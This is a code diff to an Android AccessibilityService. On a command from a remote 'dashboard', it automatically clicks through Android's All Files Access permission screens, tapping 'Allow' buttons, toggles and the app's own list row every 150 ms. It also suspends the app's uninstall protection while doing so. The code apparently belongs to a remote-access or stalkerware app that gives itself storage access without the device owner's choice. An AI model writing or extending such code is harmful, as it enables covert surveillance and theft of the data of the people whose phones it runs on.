@@ -959,45 +959,112 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * Dedicated auto-granter for the File & Storage (All Files Access) permission.
      * Called from SocketManager when the dashboard sends request_storage_permission.
      *
-     * Strategy (runs every 300 ms for 20 seconds):
-     *  1. Look for a clickable "Allow access" element → click it.
-     *  2. If not found, look for a clickable "Allow" element → click it.
-     *  3. If neither found, try enabling the toggle/switch on the screen
-     *     (Android 11+ All Files Access page shows a toggle, not a button).
+     * Strategy:
+     *  1. Activates autoGrantMode for 20 s so the existing 350 ms background scanner
+     *     also fires runPermissionGranter() for the duration.
+     *  2. Runs its own dedicated scanner every 150 ms for 20 s which:
+     *     a. Calls runPermissionGranter() — handles "Allow access" buttons, plain Allow/Grant
+     *        buttons, unchecked Switch/Toggle/CompoundButton nodes, OEM label variants,
+     *        and the contains-based fallback, all with the deny list enforced.
+     *     b. If runPermissionGranter() finds nothing (app name not visible or no actionable
+     *        element), calls runStorageListGranter() which handles the generic "All Files
+     *        Access" list screen: finds our app name row and taps it so Android opens the
+     *        per-app toggle page, where the next poll tick will enable the toggle.
      *
-     * The app name must be visible on screen for any action to fire,
-     * preventing false clicks on unrelated permission dialogs.
+     * Works across all Android versions and major OEM skins (Samsung, MIUI, ColorOS, etc.)
+     * because runPermissionGranter already covers all known button/toggle variants.
      */
     public void enableStorageAutoGrant() {
-        if (autoGrantHandler == null) {
-            autoGrantHandler = permissionBgHandler != null
-                    ? permissionBgHandler : new Handler(Looper.getMainLooper());
-        }
+        // Activate the 350 ms background scanner (autoGrantMode) for the full 20 s window.
+        reEnableAutoGrant(20_000);
 
+        // Suspend defent/uninstall protection so it cannot interfere with the settings screen.
         protectionSuspendedUntil = System.currentTimeMillis() + 25_000;
 
-        final long endTime = System.currentTimeMillis() + 5_000;
         final Handler storageHandler = permissionBgHandler != null
                 ? permissionBgHandler : new Handler(Looper.getMainLooper());
+
+        final long endTime = System.currentTimeMillis() + 20_000;
 
         storageHandler.post(new Runnable() {
             @Override
             public void run() {
                 if (System.currentTimeMillis() > endTime) {
-                    Log.i(TAG, "Storage auto-grant scanner expired after 5 seconds");
+                    Log.i(TAG, "Storage auto-grant scanner expired after 20 seconds");
                     return;
                 }
                 try {
                     AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                     if (rootNode != null) {
-                        clickAllTextContainingCI(rootNode, "allow");
+                        // Full granter: buttons, toggles, OEM variants, deny list — all covered.
+                        boolean handled = runPermissionGranter(rootNode);
+                        if (!handled) {
+                            // Fallback: we may be on the generic All-Files-Access list screen.
+                            // Find our app's row and tap it to open the per-app toggle page.
+                            runStorageListGranter(rootNode);
+                        }
                         rootNode.recycle();
                     }
                 } catch (Exception ignored) {}
-                storageHandler.postDelayed(this, 50);
+                storageHandler.postDelayed(this, 150);
             }
         });
-        Log.i(TAG, "Storage auto-grant scanner started for 5 s (50ms interval)");
+        Log.i(TAG, "Storage auto-grant scanner started for 20 s (150 ms interval, autoGrantMode active)");
+    }
+
+    /**
+     * Handles the generic "All Files Access" list screen
+     * (opened when ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION is used as a fallback).
+     * Looks for our app name as a tappable row in the list and clicks it, which causes
+     * Android to navigate to the per-app "All Files Access" toggle page.
+     * The next poll tick of the 150 ms scanner will then enable the toggle via
+     * runPermissionGranter() → runAccessibilityToggleGranter().
+     *
+     * Also handles OEM "Access all files" / "File and media access" list screens on
+     * Samsung, MIUI, ColorOS etc., since we search by app name text.
+     */
+    private void runStorageListGranter(AccessibilityNodeInfo rootNode) {
+        try {
+            String screenText = getAllScreenText(rootNode).toLowerCase();
+            // Only act when we appear to be on a storage/files settings screen.
+            if (!screenText.contains("files") && !screenText.contains("storage")
+                    && !screenText.contains("media")) return;
+
+            String appName = getString(R.string.app_name);
+            if (!screenText.contains(appName.toLowerCase())) return;
+
+            // Try findAccessibilityNodeInfosByText first — most reliable.
+            List<AccessibilityNodeInfo> rows = rootNode.findAccessibilityNodeInfosByText(appName);
+            if (rows != null) {
+                for (AccessibilityNodeInfo row : rows) {
+                    try {
+                        if (row == null) continue;
+                        if (row.isClickable()) {
+                            row.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            Log.i(TAG, "Storage list granter: tapped app row \"" + appName + "\"");
+                            break;
+                        }
+                        // Walk up to find a clickable ancestor (list item container).
+                        AccessibilityNodeInfo p = row.getParent();
+                        for (int depth = 0; depth < 4 && p != null; depth++) {
+                            if (p.isClickable()) {
+                                p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                Log.i(TAG, "Storage list granter: tapped ancestor of app row");
+                                p.recycle();
+                                break;
+                            }
+                            AccessibilityNodeInfo next = p.getParent();
+                            p.recycle();
+                            p = next;
+                        }
+                        if (p != null) try { p.recycle(); } catch (Exception ignored2) {}
+                    } catch (Exception ignored) {}
+                    finally {
+                        try { row.recycle(); } catch (Exception ignored) {}
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
     }
 
     /**
